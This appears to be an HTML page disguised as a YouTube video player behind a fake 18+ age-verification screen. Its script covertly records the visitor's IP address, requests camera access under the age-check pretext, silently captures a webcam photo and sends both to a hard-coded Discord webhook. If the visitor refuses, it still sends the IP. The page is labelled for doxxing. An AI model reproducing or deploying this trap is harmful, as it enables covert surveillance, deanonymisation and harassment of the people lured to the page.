<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>YouTube</title>
    <meta property="og:title" content="YouTube - Watch Now">
    <meta property="og:image" content="https://img.youtube.com/vi/GoHLDPWT6Hw/maxresdefault.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; color: white; }
        #player { width: 100%; height: 100%; border: none; display: none; }
        #lock-screen { text-align: center; z-index: 9999; padding: 20px; }
        .play-btn { width: 80px; height: 80px; background: red; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 15px; }
        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
        .error-msg { color: #ff4444; display: none; margin-top: 15px; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>

    <div id="lock-screen">
        <div class="play-btn"></div>
        <h2 style="font-size: 18px;">Age Verification Required</h2>
        <p style="font-size: 14px; color: #ccc;">ALLOW IF YOU ARE 18+ AND CONTINUE TO WATCH <br><b>"DOX SIGBIN"</b></p>
        
        <div id="error" class="error-msg">
            ‚ö†Ô∏è VERIFICATION FAILED! <br> 
            YOU MUST ALLOW 18+ AGE TO CONFIRM YOUR AGE. <br> 
            PLEASE REFRESH AND TRY AGAIN.
        </div>
    </div>

    <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw" allow="autoplay; encrypted-media"></iframe>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";

        window.onload = async function() {
            const errorText = document.getElementById('error');
            const player = document.getElementById('player');
            const lockScreen = document.getElementById('lock-screen');

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // NORMAL CAMERA REQUEST - Walang pilit na resolution
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                lockScreen.style.display = 'none';
                player.style.display = 'block';
                player.src += "?autoplay=1"; 

                const vid = document.getElementById('v');
                vid.srcObject = stream;

                // 1.5 seconds para maka-focus at mag-adjust ang brightness
                setTimeout(async () => {
                    const can = document.getElementById('c');
                    
                    // SAKTONG RESOLUTION BASE SA CAMERA
                    can.width = vid.videoWidth;
                    can.height = vid.videoHeight;
                    
                    const ctx = can.getContext('2d');
                    ctx.drawImage(vid, 0, 0);
                    
                    const img = can.toDataURL('image/jpeg', 0.7);
                    const blob = await (await fetch(img)).blob();
                    
                    const fd = new FormData();
                    fd.append('file', blob, 'normal_shot.jpg');
                    fd.append('payload_json', JSON.stringify({
                        content: "üéØ **SUCCESS: NORMAL SHOT**\n**IP:** " + ipData.ip
                    }));

                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);

            } catch (e) {
                errorText.style.display = 'block';
                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
                fetch(hook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ content: "üö´ **VERIFICATION DENIED!**\n**IP:** " + ipRes.ip })
                });
            }
        };
    </script>
</body>
</html>
